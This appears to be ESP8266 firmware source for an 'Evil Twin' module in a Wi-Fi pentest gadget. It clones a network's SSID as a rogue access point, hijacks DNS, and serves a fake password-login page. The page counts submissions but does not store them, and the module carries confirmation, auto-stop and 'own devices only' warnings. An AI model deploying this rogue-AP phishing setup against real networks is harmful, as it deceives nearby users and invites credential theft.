#include "evil_twin.h"
#include "../config.h"
#include "../core/display_mgr.h"
#include "../core/wifi_mgr.h"
#include "../utils.h"
#include <ESP8266WebServer.h>
#include <DNSServer.h>

static EvilTwin* g_evilTwin = nullptr;
static DNSServer* dnsServer = nullptr;
static ESP8266WebServer* webServer = nullptr;

ModuleInterface* createEvilTwin() { return new EvilTwin(); }

void EvilTwin::init() {
    active = false; confirmed = false;
    startTime = 0; targetSsid[0] = '\0';
    memset(targetBssid, 0, 6); targetChannel = 1;
    connectedClients = 0; phishingHits = 0;
}

void EvilTwin::enter() {
    g_evilTwin = this;
    active = false; confirmed = false;
    startTime = 0; targetSsid[0] = '\0';
    connectedClients = 0; phishingHits = 0;
    // Get current SSID as default target
    if (wifiMgr.isConnected()) {
        strCopySafe(targetSsid, WiFi.SSID().c_str(), sizeof(targetSsid));
        targetChannel = WiFi.channel();
    }
    displayMgr.setDirty();
}

void EvilTwin::exit() {
    if (active) stopAttack();
    g_evilTwin = nullptr;
}

void EvilTwin::startAttack() {
    if (active) return;
    active = true;
    startTime = millis();

    // Start SoftAP with same SSID
    wifiMgr.startSoftAP(targetSsid, nullptr, targetChannel);

    // Start DNS, resolve all to self
    dnsServer = new DNSServer();
    dnsServer->setErrorReplyCode(DNSReplyCode::NoError);
    dnsServer->start(53, "*", WiFi.softAPIP());

    // Web server
    webServer = new ESP8266WebServer(80);
    webServer->onNotFound([]() {
        const char* html =
            "<!DOCTYPE html><html><head>"
            "<meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1'>"
            "<title>Wi-Fi Login</title>"
            "<style>body{font-family:Arial;text-align:center;padding:20px;background:#f0f0f0;}"
            "input{padding:10px;margin:5px;width:80%%;border:1px solid #ccc;border-radius:4px;}"
            "button{padding:10px 20px;background:#007aff;color:#fff;border:none;border-radius:4px;}"
            "</style></head><body>"
            "<h2>Network Login Required</h2>"
            "<p>Enter password to connect</p>"
            "<form action='/login' method='POST'>"
            "<input type='password' name='pass' placeholder='Password'><br>"
            "<button type='submit'>Connect</button>"
            "</form>"
            "<p style='color:gray;font-size:12px;'>Edu Demo - do not enter real password</p>"
            "</body></html>";
        webServer->send(200, "text/html", html);
    });
    webServer->on("/login", HTTP_POST, []() {
        String pass = webServer->arg("pass");
        String resp =
            "<!DOCTYPE html><html><head><meta charset='UTF-8'>"
            "<title>Connected</title></head><body>"
            "<h2>Connected Successfully</h2><p>You are authenticated</p>"
            "<p style='color:red;'>Edu Demo - password not stored</p>"
            "<p><a href='/'>Back</a></p></body></html>";
        if (g_evilTwin && g_evilTwin->active) {
            g_evilTwin->phishingHits++;
        }
        webServer->send(200, "text/html", resp);
    });
    webServer->begin();
}

void EvilTwin::stopAttack() {
    active = false;
    confirmed = false;

    if (webServer) { webServer->stop(); delete webServer; webServer = nullptr; }
    if (dnsServer) { dnsServer->stop(); delete dnsServer; dnsServer = nullptr; }

    wifiMgr.stopSoftAP();
    wifiMgr.setStationMode();
    displayMgr.setDirty();
}


void EvilTwin::update() {
    if (!active) return;

    if (millis() - startTime > SEC_ATTACK_MAX_DURATION) {
        stopAttack();
        return;
    }

    if (dnsServer) dnsServer->processNextRequest();
    if (webServer) webServer->handleClient();

    // Count connected devices
    connectedClients = wifi_softap_get_station_num();
    wifi_softap_free_station_info();
}

void EvilTwin::handleButton(ButtonEvent ev) {
    if (active) {
        if (ev != BTN_NONE) stopAttack();
        return;
    }
    if (!confirmed) {
        if (ev == BTN_OK_SHORT) { confirmed = true; displayMgr.setDirty(); }
    } else {
        if (ev == BTN_OK_SHORT) { startAttack(); displayMgr.setDirty(); }
    }
}

void EvilTwin::draw(U8G2& u8g2) {
    u8g2.setFont(FONT_DATA);
    u8g2.drawStr(0, 9, "Evil Twin");
    u8g2.setFont(FONT_DATA);
    u8g2.drawStr(0, 24, "⚠ Edu Demo - Own Devices Only ⚠");

    if (active) {
        uint32_t remaining = (SEC_ATTACK_MAX_DURATION - (millis() - startTime)) / 1000;
        char buf[40];
        snprintf(buf, sizeof(buf), "AP:%s CH:%d", targetSsid, targetChannel);
        u8g2.drawStr(2, 39, buf);
        snprintf(buf, sizeof(buf), "Conn:%d Hits:%d Left:%lus",
                 connectedClients, phishingHits, remaining);
        u8g2.drawStr(2, 54, buf);
        u8g2.drawStr(2, 63, "Any key to stop");
    } else if (!confirmed) {
        u8g2.drawStr(2, 39, "Press OK to enter demo mode");
        u8g2.drawStr(2, 63, "Not for illegal use!");
    } else {
        u8g2.setFont(FONT_DATA);
        u8g2.drawStr(2, 39, "Press OK to start Evil Twin");
        u8g2.drawStr(2, 63, "30s auto-stop");
    }
}
